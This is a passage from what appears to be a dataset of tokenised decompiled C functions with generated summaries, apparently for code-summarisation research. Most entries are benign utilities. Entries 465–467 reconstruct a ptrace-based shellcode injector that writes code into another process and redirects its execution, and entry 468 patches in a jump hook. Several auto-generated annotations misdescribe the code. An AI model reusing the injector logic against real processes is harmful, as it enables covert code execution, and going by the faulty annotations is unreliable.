            "a6",
            ")",
            ";",
            "v9",
            "=",
            "a3",
            ";",
            "v10",
            "=",
            "a4",
            ";",
            "v11",
            "=",
            "a5",
            ";",
            "v12",
            "=",
            "a6",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "16",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "2",
            ")",
            "{",
            "fwrite",
            "(",
            "\"\\x1B[91m[!] \"",
            ",",
            "1uL",
            "L",
            ",",
            "9uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "1",
            ")",
            "fwrite",
            "(",
            "\"\\x1B[93m[*] \"",
            ",",
            "1uL",
            "L",
            ",",
            "9uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"\\x1B[92m[+] \"",
            ",",
            "1uL",
            "L",
            ",",
            "9uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}",
            "}",
            "vfprintf",
            "(",
            "stderr",
            ",",
            "a2",
            ",",
            "arg",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\x1B[0m\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "5uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v8",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from a specific offset within the FS segment register, commonly utilized in low-level programming for accessing thread-local storage or operating system structures on x86 architecture.",
            "The function `printf` is being redefined and utilized within a source code containing an RPN (Reverse Polish Notation) calculator and includes a header file for system-dependent macros and formatting definitions.",
            "The \"return\" function likely serves as a placeholder or indicator within code snippets but does not seem to have a specific implementation within the provided snippets."
        ],
        "longer_label": "The provided code likely represents a logging function in C, utilizing variable arguments and ANSI escape codes for colored output, while incorporating low-level operations such as reading from thread-local storage, with annotations indicating additional context about relevant functions and usage scenarios."
    },
    {
        "id": 463,
        "docstring_tokens": [
            "This",
            "code",
            "prints",
            "the",
            "binary",
            "representation",
            "of",
            "an",
            "unsigned",
            "integer",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "unsigned",
            "int",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0x80000000",
            ";",
            "i",
            ";",
            "i",
            ">",
            ">",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "i",
            "&",
            "a1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v1",
            "=",
            "49",
            ";",
            "else",
            "v1",
            "=",
            "48",
            ";",
            "putchar",
            "(",
            "v1",
            ")",
            ";",
            "}",
            "return",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `putchar` appears to be implemented in assembly language (likely for a bootloader or low-level environment) to output a character to the screen using BIOS interrupt `int 0x10` with the `0x0e` function, ensuring direct character display on a system with possibly restricted or specific hardware access."
        ],
        "longer_label": "The provided code defines a function in assembly language to print the binary representation of an integer using putchar implemented with BIOS interrupt `int 0x10` function `0x0e`, likely for low-level environments or bootloaders, with direct character display to the screen."
    },
    {
        "id": 464,
        "docstring_tokens": [
            "The",
            "hex_dump",
            "function",
            "prints",
            "the",
            "hexadecimal",
            "representation",
            "of",
            "the",
            "data",
            "stored",
            "at",
            "the",
            "given",
            "address",
            "with",
            "a",
            "specified",
            "length",
            ",",
            "displaying",
            "8",
            "bytes",
            "per",
            "line",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "i",
            ";",
            "printf",
            "(",
            "\"[0]\\t\"",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "a2",
            ">",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "printf",
            "(",
            "\"%02x  \"",
            ",",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "int",
            ")",
            "i",
            "+",
            "a1",
            ")",
            ")",
            ";",
            "if",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "i",
            "+",
            "1",
            ")",
            "&",
            "7",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "i",
            "+",
            "1",
            ")",
            "&",
            "0xF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "printf",
            "(",
            "\"    \"",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"\\n[+%d]\\t\"",
            ",",
            "i",
            "+",
            "1",
            ")",
            ";",
            "}",
            "}",
            "return",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function in the provided code snippets appears to be a modified version of the standard C library function used for printing formatted output, likely tailored for specific platforms or environments and extended to include additional functionality like handling RPN calculator expressions and custom printf formatting options."
        ],
        "longer_label": "The provided code is a function named `hex_dump` designed to print a hexadecimal dump of memory starting from the address `a1` with a length specified by `a2`, formatted to display bytes in rows of 16 with additional spacing and newline characters for readability."
    },
    {
        "id": 465,
        "docstring_tokens": [
            "The",
            "code",
            "pokes",
            "text",
            "into",
            "the",
            "memory",
            "of",
            "a",
            "specified",
            "process",
            "at",
            "a",
            "given",
            "address",
            "by",
            "using",
            "ptrace",
            "with",
            "word",
            "alignment",
            "and",
            "error",
            "handling",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "const",
            "void",
            "*",
            "a3",
            ",",
            "size_t",
            "a4",
            ")",
            "{",
            "int",
            "*",
            "v4",
            ";",
            "char",
            "*",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "int",
            "i",
            ";",
            "char",
            "*",
            "dest",
            ";",
            "dest",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "(",
            "a4",
            "&",
            "7",
            ")",
            "+",
            "a4",
            ")",
            ";",
            "memcpy",
            "(",
            "dest",
            ",",
            "a3",
            ",",
            "a4",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "a4",
            ">",
            "i",
            ";",
            "i",
            "+",
            "=",
            "8",
            ")",
            "{",
            "if",
            "(",
            "ptrace",
            "(",
            "PTRACE_POKETEXT",
            ",",
            "a1",
            ",",
            "i",
            "+",
            "a2",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "dest",
            "[",
            "i",
            "]",
            ")",
            "<",
            "0",
            ")",
            "{",
            "v4",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v5",
            "=",
            "strerror",
            "(",
            "*",
            "v4",
            ")",
            ";",
            "logs",
            "(",
            "2",
            ",",
            "\"%s: %s\"",
            ",",
            "(",
            "__int64",
            ")",
            "\"ptrace POKE\"",
            ",",
            "(",
            "__int64",
            ")",
            "v5",
            ",",
            "v6",
            ",",
            "v7",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "free",
            "(",
            "dest",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `strerror` is being implemented to provide a local version of the standard C library function `strerror`, used for converting system error numbers into human-readable error messages, in cases where the system-provided `strerror` function is not available."
        ],
        "longer_label": "The given code defines a function `poke_text` which writes data from a source to a target process's memory using `ptrace`, handling errors with a local implementation of `strerror`, and freeing allocated memory before returning."
    },
    {
        "id": 466,
        "docstring_tokens": [
            "The",
            "code",
            "attempts",
            "to",
            "find",
            "the",
            "address",
            "of",
            "a",
            "syscall",
            "instruction",
            "in",
            "a",
            "process",
            "'s",
            "memory",
            "by",
            "iterating",
            "over",
            "a",
            "buffer",
            "of",
            "text",
            "and",
            "comparing",
            "it",
            "to",
            "a",
            "specific",
            "syscall",
            "operation",
            "code",
            ",",
            "returning",
            "the",
            "address",
            "offset",
            "of",
            "the",
            "syscall",
            "if",
            "found",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "v5",
            ";",
            "char",
            "*",
            "s1",
            ";",
            "char",
            "*",
            "ptr",
            ";",
            "v5",
            "=",
            "1024",
            ";",
            "ptr",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x400uL",
            "L",
            ")",
            ";",
            "peek_text",
            "(",
            "a1",
            ",",
            "a2",
            "-",
            "1024",
            ",",
            "(",
            "__int64",
            ")",
            "ptr",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "s1",
            "=",
            "ptr",
            ";",
            "for",
            "(",
            "i",
            "=",
            "memcmp",
            "(",
            "ptr",
            ",",
            "&",
            "unk_30E4",
            ",",
            "2uL",
            "L",
            ")",
            ";",
            "i",
            ";",
            "i",
            "=",
            "memcmp",
            "(",
            "s1",
            ",",
            "&",
            "unk_30E4",
            ",",
            "2uL",
            "L",
            ")",
            ")",
            "{",
            "+",
            "+",
            "s1",
            ";",
            "if",
            "(",
            "!",
            "v5",
            "-",
            "-",
            ")",
            "{",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "s1",
            "-",
            "ptr",
            "+",
            "a2",
            "-",
            "1024",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `syscall` function, along with related assembly code and system function declarations, appears to facilitate system call handling within an operating system kernel, likely for an ARM64 architecture, allowing user-space programs to request services from the kernel.",
            "The provided code snippets include a custom `malloc` function and several other functions related to array manipulation, memory allocation, and mathematical operations, likely designed for educational or experimental purposes in C programming.",
            "The function `memcmp` is commonly used for byte-by-byte comparison of two memory blocks, typically for sorting, searching, or determining equality, as seen in the provided C code snippets where it's declared and utilized in different contexts."
        ],
        "longer_label": "The provided C code snippet appears to be a function (`find_syscall_addr`) designed for locating the address of a system call handler within an ARM64 operating system kernel by comparing memory blocks, employing custom memory allocation and manipulation functions, likely for educational or experimental purposes."
    },
    {
        "id": 467,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "C",
            "program",
            "that",
            "injects",
            "shellcode",
            "into",
            "a",
            "process",
            "or",
            "creates",
            "a",
            "new",
            "process/thread",
            "to",
            "run",
            "the",
            "shellcode",
            ",",
            "using",
            "ptrace",
            "for",
            "process",
            "manipulation",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "int",
            "*",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "__int64",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "__int64",
            "v23",
            ";",
            "__int64",
            "v24",
            ";",
            "__int64",
            "v25",
            ";",
            "__int64",
            "v26",
            ";",
            "__int64",
            "v27",
            ";",
            "__int64",
            "v28",
            ";",
            "__int64",
            "v29",
            ";",
            "__int64",
            "v30",
            ";",
            "__int64",
            "v31",
            ";",
            "__int64",
            "v32",
            ";",
            "int",
            "*",
            "v33",
            ";",
            "char",
            "*",
            "v34",
            ";",
            "__int64",
            "v35",
            ";",
            "__int64",
            "v36",
            ";",
            "__int64",
            "v37",
            ";",
            "__int64",
            "v38",
            ";",
            "__int64",
            "v39",
            ";",
            "__int64",
            "v40",
            ";",
            "__int64",
            "v41",
            ";",
            "__int64",
            "v42",
            ";",
            "__int64",
            "v43",
            ";",
            "__int64",
            "v44",
            ";",
            "__int64",
            "v45",
            ";",
            "__int64",
            "v46",
            ";",
            "__int64",
            "v47",
            ";",
            "__int64",
            "v48",
            ";",
            "int",
            "*",
            "v49",
            ";",
            "char",
            "*",
            "v50",
            ";",
            "__int64",
            "v51",
            ";",
            "__int64",
            "v52",
            ";",
            "int",
            "*",
            "v53",
            ";",
            "char",
            "*",
            "v54",
            ";",
            "__int64",
            "v55",
            ";",
            "__int64",
            "v56",
            ";",
            "int",
            "stat_loc",
            ";",
            "__pid_t",
            "pid",
            ";",
            "int",
            "v60",
            ";",
            "int",
            "i",
            ";",
            "unsigned",
            "int",
            "v62",
            ";",
            "int",
            "v63",
            ";",
            "__int64",
            "v64",
            ";",
            "__int64",
            "v65",
            ";",
            "__int64",
            "v66",
            "[",
            "28",
            "]",
            ";",
            "v66",
            "[",
            "27",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v60",
            "=",
            "0",
            ";",
            "fwrite",
            "(",
            "\"\\n\"",
            "\"\\x1B[96m\\t***************************************\\n\"",
            "\"\\t*  Adun - process shellcode injector  *\\n\"",
            "\"\\t***************************************\\n\"",
            "\"\\n\"",
            "\"\\x1B[0m\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x86uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v63",
            "=",
            "getopt",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"pd\"",
            ")",
            ";",
            "if",
            "(",
            "v63",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "v63",
            "=",
            "=",
            "100",
            ")",
            "{",
            "v60",
            "|",
            "=",
            "2u",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v63",
            "!",
            "=",
            "112",
            ")",
            "usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "v60",
            "|",
            "=",
            "1u",
            ";",
            "}",
            "}",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "argc",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "argv",
            "[",
            "i",
            "]",
            "!",
            "=",
            "45",
            ")",
            "{",
            "pid",
            "=",
            "atoi",
            "(",
            "argv",
            "[",
            "i",
            "]",
            ")",
            ";",
            "if",
            "(",
            "pid",
            ")",
            "break",
            ";",
            "}",
            "if",
            "(",
            "i",
            "=",
            "=",
            "argc",
            ")",
            "usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "pid",
            "|",
            "|",
            "(",
            "v60",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "v60",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"attaching to proccess ( id: %d )\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "pid",
            ",",
            "v3",
            ",",
            "v4",
            ",",
            "v5",
            ",",
            "argv",
            ")",
            ";",
            "if",
            "(",
            "ptrace",
            "(",
            "PTRACE_ATTACH",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "pid",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "{",
            "v6",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v7",
            "=",
            "strerror",
            "(",
            "*",
            "v6",
            ")",
            ";",
            "logs",
            "(",
            "2",
            ",",
            "\"%s: %s\"",
            ",",
            "(",
            "__int64",
            ")",
            "\"ptrace\"",
            ",",
            "(",
            "__int64",
            ")",
            "v7",
            ",",
            "v8",
            ",",
            "v9",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "waitpid",
            "(",
            "pid",
            ",",
            "&",
            "stat_loc",
            ",",
            "0",
            ")",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"allocating memory\"",
            ",",
            "v10",
            ",",
            "v11",
            ",",
            "v12",
            ",",
            "v13",
            ")",
            ";",
            "v66",
            "[",
            "0",
            "]",
            "=",
            "remote_mmap",
            "(",
            "pid",
            ",",
            "0L",
            "L",
            ",",
            "4096L",
            "L",
            ",",
            "3",
            ",",
            "34",
            ",",
            "-",
            "1",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v64",
            "=",
            "remote_mmap",
            "(",
            "pid",
            ",",
            "0L",
            "L",
            ",",
            "4096L",
            "L",
            ",",
            "3",
            ",",
            "34",
            ",",
            "-",
            "1",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v65",
            "=",
            "v64",
            "+",
            "4096",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"copying shellcode ( %d bytes )\"",
            ",",
            "113L",
            "L",
            ",",
            "v14",
            ",",
            "v15",
            ",",
            "v16",
            ")",
            ";",
            "poke_text",
            "(",
            "pid",
            ",",
            "v66",
            "[",
            "0",
            "]",
            ",",
            "shellcode",
            ",",
            "0x71uL",
            "L",
            ")",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"setting memory permissions\"",
            ",",
            "v17",
            ",",
            "v18",
            ",",
            "v19",
            ",",
            "v20",
            ")",
            ";",
            "remote_mprotect",
            "(",
            "pid",
            ",",
            "v66",
            "[",
            "0",
            "]",
            ",",
            "4096L",
            "L",
            ",",
            "4",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v60",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "logs",
            "(",
            "0",
            ",",
            "\"redirecting execution flow to shellcode\"",
            ",",
            "v21",
            ",",
            "v22",
            ",",
            "v23",
            ",",
            "v24",
            ")",
            ";",
            "remote_jmp",
            "(",
            "pid",
            ",",
            "v66",
            "[",
            "0",
            "]",
            ")",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"detaching\"",
            ",",
            "v25",
            ",",
            "v26",
            ",",
            "v27",
            ",",
            "v28",
            ")",
            ";",
            "if",
            "(",
            "ptrace",
            "(",
            "PTRACE_DETACH",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "pid",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "{",
            "v33",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v34",
            "=",
            "strerror",
            "(",
            "*",
            "v33",
            ")",
            ";",
            "logs",
            "(",
            "2",
            ",",
            "\"%s: %s\"",
            ",",
            "(",
            "__int64",
            ")",
            "\"ptrace DETACH\"",
            ",",
            "(",
            "__int64",
            ")",
            "v34",
            ",",
            "v35",
            ",",
            "v36",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "logs",
            "(",
            "0",
            ",",
            "\"setting up child's stack\"",
            ",",
            "v21",
            ",",
            "v22",
            ",",
            "v23",
            ",",
            "v24",
            ")",
            ";",
            "poke_text",
            "(",
            "pid",
            ",",
            "v64",
            ",",
            "v66",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v60",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "logs",
            "(",
            "0",
            ",",
            "\"starting new process\"",
            ",",
            "v37",
            ",",
            "v38",
            ",",
            "v39",
            ",",
            "v40",
            ")",
            ";",
            "v62",
            "=",
            "remote_clone",
            "(",
            "pid",
            ",",
            "8448",
            ",",
            "v65",
            ")",
            ";",
            "}",
            "else",
            "{",
            "logs",
            "(",
            "0",
            ",",
            "\"starting new thread\"",
            ",",
            "v37",
            ",",
            "v38",
            ",",
            "v39",
            ",",
            "v40",
            ")",
            ";",
            "v62",
            "=",
            "remote_clone",
            "(",
            "pid",
            ",",
            "77568",
            ",",
            "v65",
            ")",
            ";",
            "}",
            "logs",
            "(",
            "0",
            ",",
            "\"running shellcode\"",
            ",",
            "v41",
            ",",
            "v42",
            ",",
            "v43",
            ",",
            "v44",
            ")",
            ";",
            "remote_jmp",
            "(",
            "v62",
            ",",
            "v66",
            "[",
            "0",
            "]",
            ")",
            ";",
            "logs",
            "(",
            "0",
            ",",
            "\"detaching\"",
            ",",
            "v45",
            ",",
            "v46",
            ",",
            "v47",
            ",",
            "v48",
            ")",
            ";",
            "if",
            "(",
            "ptrace",
            "(",
            "PTRACE_DETACH",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "pid",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "{",
            "v49",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v50",
            "=",
            "strerror",
            "(",
            "*",
            "v49",
            ")",
            ";",
            "logs",
            "(",
            "2",
            ",",
            "\"%s: %s\"",
            ",",
            "(",
            "__int64",
            ")",
            "\"ptrace DETACH\"",
            ",",
            "(",
            "__int64",
            ")",
            "v50",
            ",",
            "v51",
            ",",
            "v52",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "ptrace",
            "(",
            "PTRACE_DETACH",
            ",",
            "v62",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "{",
            "v53",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v54",
            "=",
            "strerror",
            "(",
            "*",
            "v53",
            ")",
            ";",
            "logs",
            "(",
            "2",
            ",",
            "\"%s: %s\"",
            ",",
            "(",
            "__int64",
            ")",
            "\"ptrace DETACH\"",
            ",",
            "(",
            "__int64",
            ")",
            "v54",
            ",",
            "v55",
            ",",
            "v56",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "logs",
            "(",
            "0",
            ",",
            "\"done\"",
            ",",
            "v29",
            ",",
            "v30",
            ",",
            "v31",
            ",",
            "v32",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a C program designed to inject shellcode into a specified process, offering options for either attaching the shellcode as a new thread or process, with functionalities for memory allocation, permission setting, and execution control, utilizing system calls like `ptrace`, `remote_mmap`, and `remote_jmp`."
    },
    {
        "id": 468,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "PatchInJump",
            "`",
            "patches",
            "a",
            "jump",
            "instruction",
            "at",
            "the",
            "specified",
            "address",
            "to",
            "redirect",
            "execution",
            "flow",
            "to",
            "the",
            "destination",
            "address",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "void",
            "*",
            "a2",
            ")",
            "{",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a2",
            ")",
            "{",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a1",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "1",
            ")",
            "=",
            "37",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "3",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "5",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "6",
            ")",
            "=",
            "a2",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code defines a function PatchInJump to patch a jump instruction at a specific memory address with a new relative address."
    },
    {
        "id": 469,
        "docstring_tokens": [
            "The",
            "code",
            "reverses",
            "the",
            "order",
            "of",
            "bytes",
            "in",
            "a",
            "given",
            "memory",
            "block",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "void",
            "*",
            "ptr",
            ",",
            "size_t",
            "n",
            ")",
            "{",
            "uint8_t",
            "*",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "uint8_t",
            "*",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "uint8_t",
            "swap",
            ";",
            "size_t",
            "i",
            ";",
            "size_t",
            "half",
            ";",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "half",
            "=",
            "n",
            ">",
            ">",
            "1",
            ";",
            "while",
            "(",
            "i",
            "<",
            "half",
            ")",
            "{",
            "v2",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "ptr",
            "+",
            "i",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ";",
            "}",
            "swap",
            "=",
            "*",
            "v2",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "n",
            "-",
            "i",
            "-",
            "1",
            "+",
            "(",
            "_BYTE",
            ")",
            "ptr",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v4",
            ")",
            "_asan_report_load1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "v3",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "_asan_report_store1",
            "(",
            "v3",
            ",",
            "v5",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v3",
            "=",
            "v5",
            ";",
            "v6",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v6",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
